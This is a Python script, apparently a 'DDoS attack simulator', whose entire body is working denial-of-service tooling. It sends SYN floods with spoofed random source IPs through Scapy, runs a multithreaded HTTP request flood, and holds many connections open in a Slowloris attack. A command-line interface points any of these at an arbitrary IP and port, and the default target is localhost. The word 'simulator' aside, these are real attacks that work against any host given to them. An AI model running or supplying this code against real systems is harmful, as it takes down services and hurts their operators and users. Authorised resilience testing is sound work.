"""
DDoS Attack Simulator
Simulates various DDoS attacks using Scapy for packet crafting.
"""

import time
import random
import threading
from scapy.all import IP, TCP, send, RandIP, RandShort
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class DDoSSimulator:
    """Simulates DDoS attacks against a target server."""
    
    def __init__(self, target_ip='127.0.0.1', target_port=5000):
        """
        Initialize the DDoS simulator.
        
        Args:
            target_ip: Target server IP address
            target_port: Target server port
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.attack_threads = []
        
    def syn_flood_attack(self, duration=30, packet_rate=100):
        """
        Simulate SYN flood attack.
        
        Args:
            duration: Attack duration in seconds
            packet_rate: Packets per second to send
        """
        logger.info(f"Starting SYN flood attack on {self.target_ip}:{self.target_port}")
        logger.info(f"Duration: {duration}s, Rate: {packet_rate} pps")
        
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time and self.running:
            # Create SYN packet with random source IP
            packet = IP(dst=self.target_ip, src=RandIP()) / TCP(
                dport=self.target_port,
                sport=RandShort(),
                flags="S"
            )
            
            try:
                send(packet, verbose=0)
                packets_sent += 1
                
                # Control packet rate
                time.sleep(1.0 / packet_rate)
            except Exception as e:
                logger.error(f"Error sending packet: {e}")
                
        logger.info(f"SYN flood attack completed. Packets sent: {packets_sent}")
        
    def http_flood_attack(self, duration=30, requests_per_second=50, num_threads=5):
        """
        Simulate HTTP flood attack using multiple threads.
        
        Args:
            duration: Attack duration in seconds
            requests_per_second: Requests per second per thread
            num_threads: Number of concurrent attack threads
        """
        logger.info(f"Starting HTTP flood attack on {self.target_ip}:{self.target_port}")
        logger.info(f"Duration: {duration}s, {num_threads} threads, {requests_per_second} req/s per thread")
        
        def attack_worker():
            """Worker thread for HTTP flood."""
            import requests
            end_time = time.time() + duration
            requests_sent = 0
            
            while time.time() < end_time and self.running:
                try:
                    response = requests.get(
                        f"http://{self.target_ip}:{self.target_port}/api/data",
                        timeout=1
                    )
                    requests_sent += 1
                    time.sleep(1.0 / requests_per_second)
                except Exception as e:
                    logger.debug(f"Request failed: {e}")
                    
            logger.info(f"Worker thread completed. Requests sent: {requests_sent}")
        
        # Start attack threads
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=attack_worker)
            thread.start()
            threads.append(thread)
            
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
            
        logger.info("HTTP flood attack completed")
        
    def slowloris_attack(self, duration=30, num_connections=200):
        """
        Simulate Slowloris attack (keeps many connections open).
        
        Args:
            duration: Attack duration in seconds
            num_connections: Number of concurrent connections to maintain
        """
        logger.info(f"Starting Slowloris attack on {self.target_ip}:{self.target_port}")
        logger.info(f"Duration: {duration}s, {num_connections} connections")
        
        import socket
        import threading
        
        connections = []
        
        def create_connection():
            """Create and maintain a slow connection."""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                # Send partial HTTP request to keep connection open
                sock.send(b"GET /api/data HTTP/1.1\r\n")
                sock.send(b"Host: " + self.target_ip.encode() + b"\r\n")
                connections.append(sock)
                
                # Keep sending headers slowly to maintain connection
                start_time = time.time()
                while time.time() < start_time + duration and self.running:
                    try:
                        sock.send(b"X-a: b\r\n")
                        time.sleep(10)  # Send header every 10 seconds
                    except:
                        break
                        
            except Exception as e:
                logger.debug(f"Connection error: {e}")
                
        # Create multiple connections
        threads = []
        for i in range(num_connections):
            thread = threading.Thread(target=create_connection)
            thread.start()
            threads.append(thread)
            time.sleep(0.1)  # Stagger connection attempts
            
        # Wait for attack duration
        time.sleep(duration)
        
        # Close all connections
        for sock in connections:
            try:
                sock.close()
            except:
                pass
                
        for thread in threads:
            thread.join()
            
        logger.info(f"Slowloris attack completed. Connections created: {len(connections)}")
        
    def stop_attack(self):
        """Stop all running attacks."""
        logger.info("Stopping all attacks...")
        self.running = False


def main():
    """Main function for command-line usage."""
    import argparse
    
    parser = argparse.ArgumentParser(description='DDoS Attack Simulator')
    parser.add_argument('--target', default='127.0.0.1', help='Target IP address')
    parser.add_argument('--port', type=int, default=5000, help='Target port')
    parser.add_argument('--attack', choices=['syn', 'http', 'slowloris'], 
                       default='http', help='Attack type')
    parser.add_argument('--duration', type=int, default=30, help='Attack duration (seconds)')
    parser.add_argument('--rate', type=int, default=100, help='Packet/request rate per second')
    
    args = parser.parse_args()
    
    simulator = DDoSSimulator(target_ip=args.target, target_port=args.port)
    simulator.running = True
    
    try:
        if args.attack == 'syn':
            simulator.syn_flood_attack(duration=args.duration, packet_rate=args.rate)
        elif args.attack == 'http':
            simulator.http_flood_attack(duration=args.duration, requests_per_second=args.rate)
        elif args.attack == 'slowloris':
            simulator.slowloris_attack(duration=args.duration, num_connections=args.rate)
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
    finally:
        simulator.stop_attack()


if __name__ == '__main__':
    main()

